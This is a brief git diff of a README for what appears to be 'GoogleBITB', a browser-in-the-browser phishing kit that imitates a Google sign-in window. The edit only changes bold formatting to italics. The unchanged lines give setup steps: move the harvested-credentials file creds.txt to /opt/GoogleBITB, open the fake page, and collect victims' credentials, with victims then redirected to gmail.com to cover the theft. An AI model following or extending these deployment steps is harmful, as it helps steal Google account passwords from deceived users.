@@ -28,7 +28,7 @@ Move the credentials file into a non-public folder:
 mkdir /opt/GoogleBITB && mv creds.txt /opt/GoogleBITB/creds.txt
 ```
 
-Then visit <b>/GoogleBITB/index.html</b> in your browser and give it a try! Any gathered credentials will be stored in <b>/opt/GoogleBITB/creds.txt</b>
+Then visit <i>/GoogleBITB/index.html</i> in your browser and give it a try! Any gathered credentials will be stored in <i>/opt/GoogleBITB/creds.txt</i>
 
 Users will be prompted to close the window and redirected to gmail.com.
 
